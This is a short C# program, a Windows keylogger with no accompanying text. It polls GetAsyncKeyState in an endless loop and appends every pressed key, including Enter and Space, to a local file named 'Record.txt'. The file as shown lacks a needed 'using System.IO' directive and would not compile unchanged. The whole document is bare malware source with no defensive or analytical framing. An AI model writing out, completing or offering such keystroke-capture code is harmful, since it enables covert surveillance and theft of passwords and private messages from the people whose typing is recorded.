using System;
using System.Runtime.InteropServices;
class Program
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    static void Main(string[] args)
    {
        CaptureKeyboardInput();
    }
    private static void CaptureKeyboardInput()
    {
        char c;
        while(true)
        {
            for(c = (char)8;c <=(char)222; c++)
            {
                if(GetAsyncKeyState(c) == -32767)
                {
                    using(StreamWriter writer = new StreamWriter("Record.txt", true))
                    {
                        switch(c)
                        {
                            case (char)32:
                            writer.Write(" ");
                            break;
                            case (char)13:
                            writer.Write("<Enter> \n");
                            break;
                            default:
                            writer.Write(c);
                            break;
                        }
                    }
                }
            }
        }
    }
}